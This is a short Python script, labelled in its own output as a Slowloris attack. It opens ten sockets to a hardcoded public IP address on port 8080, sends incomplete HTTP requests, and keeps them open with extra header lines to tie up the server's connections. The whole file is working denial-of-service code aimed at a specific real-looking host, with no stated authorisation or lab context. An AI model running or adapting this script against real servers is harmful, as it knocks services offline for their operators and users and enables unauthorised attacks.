#!/usr/bin/env python3
import socket
import time

HOST = "212.182.24.27"
PORT = 8080
SOCKET_COUNT = 10


def main():
    sockets = []
    print(
        f"[INFO] Starting Slowloris attack with {SOCKET_COUNT} sockets against {HOST}:{PORT}"
    )
    try:
        for i in range(SOCKET_COUNT):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.connect((HOST, PORT))

                request = (
                    "GET / HTTP/1.1\r\n"
                    f"Host: {HOST}\r\n"
                    "User-Agent: Slowloris\r\n"
                    "Accept-language: en-US,en,q=0.5\r\n"
                )
                s.sendall(request.encode())
                sockets.append(s)
            except socket.error:
                break

        print(f"[INFO] Connected {len(sockets)} sockets.")

        for _ in range(2):
            print("[INFO] Sending keep-alive headers...")
            for s in list(sockets):
                try:
                    s.sendall(b"X-a: b\r\n")
                except socket.error:
                    sockets.remove(s)
            time.sleep(0.5)

    except Exception as e:
        print(f"[ERROR] Client error: {e}")
    finally:
        for s in sockets:
            s.close()
        print("[INFO] Attack finished.")


if __name__ == "__main__":
    main()
